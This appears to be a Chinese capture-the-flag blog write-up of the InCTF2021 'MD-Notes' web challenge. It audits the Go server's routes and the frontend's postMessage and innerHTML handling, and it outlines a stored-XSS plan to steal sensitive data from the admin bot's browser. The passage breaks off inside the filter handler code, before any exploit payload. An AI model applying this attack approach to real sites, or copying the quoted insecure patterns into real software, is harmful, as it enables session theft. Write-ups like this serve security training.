@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>MD-Notes - p1nant0m</title><meta name="Description" content="p1nant0m"><meta property="og:title" content="MD-Notes" />
+<meta property="og:description" content="​ 后端编写语言：GO ​ 前端编写语言：HTML &amp;&amp; JavaScript ​ 本地镜像搭建：因为众所周知的原因，我们在国内拉取Go依赖镜像时相当的慢，并且有可能根本无法进行连接下载，我们需要在Dockerfile中或使用Go本身去配置代理选项的使用。通过在终端上或在Dockerfile中执行下面的语句我们可以配置国内代理， 1 RUN go env -w GOPROXY=&#34;https://goproxy.cn,direct&#34; 业务逻辑分析与代码审查 ​ 代理配置完后我们直接来看题目，直接进入到http://localho" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1nant0m.com/2021-10-20-md-notes/" /><meta property="og:image" content="https://p1nant0m.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-20T12:00:00+00:00" />
+<meta property="article:modified_time" content="2021-10-20T12:00:00+00:00" /><meta property="og:site_name" content="p1nant0m" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://p1nant0m.com/logo.png"/>
+
+<meta name="twitter:title" content="MD-Notes"/>
+<meta name="twitter:description" content="​ 后端编写语言：GO ​ 前端编写语言：HTML &amp;&amp; JavaScript ​ 本地镜像搭建：因为众所周知的原因，我们在国内拉取Go依赖镜像时相当的慢，并且有可能根本无法进行连接下载，我们需要在Dockerfile中或使用Go本身去配置代理选项的使用。通过在终端上或在Dockerfile中执行下面的语句我们可以配置国内代理， 1 RUN go env -w GOPROXY=&#34;https://goproxy.cn,direct&#34; 业务逻辑分析与代码审查 ​ 代理配置完后我们直接来看题目，直接进入到http://localho"/>
+<meta name="application-name" content="我的网站">
+<meta name="apple-mobile-web-app-title" content="我的网站"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://p1nant0m.com/2021-10-20-md-notes/" /><link rel="next" href="https://p1nant0m.com/2021-11-04-shenzhen-office/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "MD-Notes",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/p1nant0m.com\/2021-10-20-md-notes\/"
+        },"genre": "posts","keywords": "Web, InCTF2021","wordcount":  5088 ,
+        "url": "https:\/\/p1nant0m.com\/2021-10-20-md-notes\/","datePublished": "2021-10-20T12:00:00+00:00","dateModified": "2021-10-20T12:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "p1nant0m"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CX84EW6PHH"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-CX84EW6PHH');
+    </script>
+    
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="p1nant0m"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="选择语言">
+                    <i class="fa fa-globe" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2021-10-20-md-notes/" selected>简体中文</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CX84EW6PHH"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-CX84EW6PHH');
+    </script>
+
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="p1nant0m"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2021-10-20-md-notes/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MD-Notes</h1><h2 class="single-subtitle">InCTF中的一道Web，涉及CORS、Stored XSS、Golang、Cookies、代码审计。</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>p1nant0m</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-10-20">2021-10-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 5088 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 11 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#业务逻辑分析与代码审查">业务逻辑分析与代码审查</a></li>
+            <li><a href="#exploit">Exploit</a></li>
+            <li><a href="#总结">总结</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>​	后端编写语言：GO</p>
+<p>​	前端编写语言：HTML &amp;&amp; JavaScript</p>
+<p>​	本地镜像搭建：因为众所周知的原因，我们在国内拉取Go依赖镜像时相当的慢，并且有可能根本无法进行连接下载，我们需要在<code>Dockerfile</code>中或使用Go本身去配置代理选项的使用。通过在终端上或在<code>Dockerfile</code>中执行下面的语句我们可以配置国内代理，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="k">RUN</span> go env -w <span class="nv">GOPROXY</span><span class="o">=</span><span class="s2">&#34;https://goproxy.cn,direct&#34;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><h4 id="业务逻辑分析与代码审查">业务逻辑分析与代码审查</h4>
+<p>​	代理配置完后我们直接来看题目，直接进入到<code>http://localhost:8080/</code>；页面布局很简单，简要的看上去是一个支持<code>markdown</code>格式的在编辑器，支持在线预览（Preview）与后端保存（Save）功能。</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927142057006.png" title="https://image.p1nant0m.com/image-20210927142057006.png" data-thumbnail="https://image.p1nant0m.com/image-20210927142057006.png" data-sub-html="<h2>题目页面展示</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927142057006.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927142057006.png, https://image.p1nant0m.com/image-20210927142057006.png 1.5x, https://image.p1nant0m.com/image-20210927142057006.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927142057006.png" />
+    </a><figcaption class="image-caption">题目页面展示</figcaption>
+    </figure>
+<p>​	我们随便的在编辑框中输入一点内容看看效果，</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927142309716.png" title="https://image.p1nant0m.com/image-20210927142309716.png" data-thumbnail="https://image.p1nant0m.com/image-20210927142309716.png" data-sub-html="<h2>尝试输入特殊字符</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927142309716.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927142309716.png, https://image.p1nant0m.com/image-20210927142309716.png 1.5x, https://image.p1nant0m.com/image-20210927142309716.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927142309716.png" />
+    </a><figcaption class="image-caption">尝试输入特殊字符</figcaption>
+    </figure>
+<p>​	可以看到我们输入的内容被进行了过滤编码，<code>&lt;</code>标签开闭合符号显然就在其中，我们考虑是否有某种方式绕过过滤实现<code>XSS</code>,单击保存后我们可以看到下列提示，</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927142537265.png" title="https://image.p1nant0m.com/image-20210927142537265.png" data-thumbnail="https://image.p1nant0m.com/image-20210927142537265.png" data-sub-html="<h2>保存后提示</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927142537265.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927142537265.png, https://image.p1nant0m.com/image-20210927142537265.png 1.5x, https://image.p1nant0m.com/image-20210927142537265.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927142537265.png" />
+    </a><figcaption class="image-caption">保存后提示</figcaption>
+    </figure>
+<p>​	进入提示的路径我们可以看到我们输入的经过过滤后的信息。</p>
+<p>​	InCTF为我们提供了一个adminBot，我们可以让它来访问我们提供的页面，考虑是<strong>CORS</strong>，利用某种方式绕过过滤器继而提交并且存储XSS注入后的恶意页面(Stored XSS）获得<code>admin</code>浏览器中的敏感信息。</p>
+<p>​	接下来我们开始分析代码</p>
+<p>​	审计<code>server.go</code>源码，我们发现了对应的路由及其相关方法，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">	<span class="nx">route</span><span class="p">.</span><span class="nf">PathPrefix</span><span class="p">(</span><span class="s">&#34;/static/&#34;</span><span class="p">).</span><span class="nf">Handler</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nf">StripPrefix</span><span class="p">(</span><span class="s">&#34;/static/&#34;</span><span class="p">,</span> <span class="nx">fs</span><span class="p">))</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">indexHandler</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/demo&#34;</span><span class="p">,</span> <span class="nx">previewHandler</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/api/flag&#34;</span><span class="p">,</span> <span class="nx">flag</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/api/filter&#34;</span><span class="p">,</span> <span class="nx">filterHandler</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;POST&#34;</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/api/create&#34;</span><span class="p">,</span> <span class="nx">createHandler</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;POST&#34;</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/{bucketid}/{postid}&#34;</span><span class="p">,</span> <span class="nx">previewHandler</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">)</span>
+	<span class="nx">route</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/_debug&#34;</span><span class="p">,</span> <span class="nx">debug</span><span class="p">).</span><span class="nf">Methods</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	<code>/</code>路由到<code>/index.html</code>，在<code>index.html</code>中我们发现preview所提供的功能是通过<code>&lt;iframe&gt;</code>导入进来的并且应用了一个Script文件（<code>/static/app.js</code>）， <code>15-20</code>行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-6&#34;</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;input-area&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
+                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-6&#34;</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;frame-area&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/demo&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;500&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;300&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	<code>/static/app.js</code>中定义了我们单击Preview与Save所对应的事件处理逻辑，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">preview</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Sending Preview..&#34;</span><span class="p">)</span>
+	<span class="nx">frame</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span> <span class="sb">`http://</span><span class="si">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="si">}</span><span class="sb">/`</span><span class="p">);</span> 
+	<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	我们在Docs中查找<code>contentWindow.postMessage()</code>的用法：</p>
+<blockquote>
+<p>​	**window.postMessage()**方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/domain" target="_blank" rel="noopener noreffer "><code>Document.domain</code></a>设置为相同的值) 时，这两个脚本才能相互通信。<strong>window.postMessage()</strong> 方法提供了一种受控机制来规避此限制，<strong>只要正确的使用，这种方法就很安全</strong>。</p>
+<p>​	从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 <code>targetWindow = window.opener</code>），然后在窗口上调用 <code>targetWindow.postMessage()</code> 方法分发一个  <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MessageEvent" target="_blank" rel="noopener noreffer "><code>MessageEvent</code></a> 消息。接收消息的窗口可以根据需要自由<a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank" rel="noopener noreffer ">处理此事件 (en-US)</a>。传递给 window.postMessage() 的参数（比如 message ）将<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage#The_dispatched_event" target="_blank" rel="noopener noreffer ">通过消息事件对象暴露给接收消息的窗口</a>。</p>
+</blockquote>
+<p>​	<strong>语法使用</strong></p>
+<blockquote>
+<p>otherWindow.postMessage(message, targetOrigin, [transfer]);</p>
+</blockquote>
+<p><code>otherWindow</code></p>
+<p>其他窗口的一个引用，比如iframe的contentWindow属性、执行<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/open" target="_blank" rel="noopener noreffer ">window.open</a>返回的窗口对象、或者是命名过或数值索引的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/frames" target="_blank" rel="noopener noreffer ">window.frames</a>。</p>
+<p><code>message</code></p>
+<p>将要发送到其他 window的数据。它将会被<a href="https://developer.mozilla.org/en-US/docs/DOM/The_structured_clone_algorithm" target="_blank" rel="noopener noreffer ">结构化克隆算法</a>序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。[<a href="https://developer.mozilla.org/en-US/docs/" target="_blank" rel="noopener noreffer ">1</a>]</p>
+<p><code>targetOrigin</code></p>
+<p>​	通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串&quot;*&quot;（<strong>表示无限制</strong>）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。<strong>如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是*。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。</strong></p>
+<p>​	上述代码中使用<code>http://${document.location.host}/</code>作为<code>targetOrigin</code>限定了<code>message</code>中的信息只能被回传至本页面中<code>index.html</code>，由<code>input-area</code>向<code>frame-area</code>传递</p>
+<p>​	在<code>preview.js</code>中设置了一个<code>messageEvent</code>监听器，当<code>windows</code>事件触发<code>message</code>事件时会回调用本函数，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Previewing..&#34;</span><span class="p">)</span>
+	<span class="kd">let</span> <span class="nx">raw</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span> <span class="c1">// input-area data
+</span><span class="c1"></span>
+	<span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;/api/filter&#34;</span><span class="p">,</span> <span class="p">{</span>
+		<span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+		<span class="nx">credentials</span><span class="o">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
+		<span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+			<span class="nx">raw</span><span class="o">:</span> <span class="nx">raw</span>
+		<span class="p">})</span>
+	<span class="p">})</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">resp</span> <span class="p">=&gt;</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+	<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="p">{</span>
+		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Filtered&#34;</span><span class="p">)</span>
+		<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">Sanitized</span>
+		<span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">);</span> 
+	<span class="p">});</span> 
+<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>​	<strong>EventTarget.addEventListener()</strong> 方法将指定的监听器注册到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget" target="_blank" rel="noopener noreffer "><code>EventTarget</code></a> 上，当该对象触发指定的事件时，指定的回调函数就会被执行。 事件目标可以是一个文档上的元素 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element" target="_blank" rel="noopener noreffer "><code>Element</code></a>,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document" target="_blank" rel="noopener noreffer "><code>Document</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window" target="_blank" rel="noopener noreffer "><code>Window</code></a>或者任何其他支持事件的对象 (比如 <code>XMLHttpRequest</code>)<code>。</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">target.addEventListener(type, listener, options);
+
+type
+表示监听事件类型的字符串。 
+
+listener
+当所监听的事件类型触发时，会接收到一个事件通知（实现了 Event 接口的对象）对象。listener 必须是一个实现了 EventListener 接口的对象，或者是一个函数。有关回调本身的详细信息，请参阅The event listener callback 
+</code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>​	事件类型参考：https://developer.mozilla.org/zh-CN/docs/Web/Events</p>
+<p>​	该函数将RawData发送至后端GoAPI接口<code>/api/filter</code>中，在这里实现过滤逻辑</p>
+<p><code>server.go</code> 	{140-171}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-GO" data-lang="GO"><span class="kd">func</span> <span class="nf">filterHandler</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">reqBody</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+	<span class="nx">w</span><span class="p">.</span><span class="nf">Header</span><span class="p">().</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s">&#34;application/json&#34;</span><span class="p">)</span>
+	<span class="kd">var</span> <span class="nx">unsanitized</span> <span class="nx">Unsanitized</span>
+
+	<span class="nx">err</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Unmarshal</span><span class="p">(</span><span class="nx">reqBody</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">unsanitized</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+
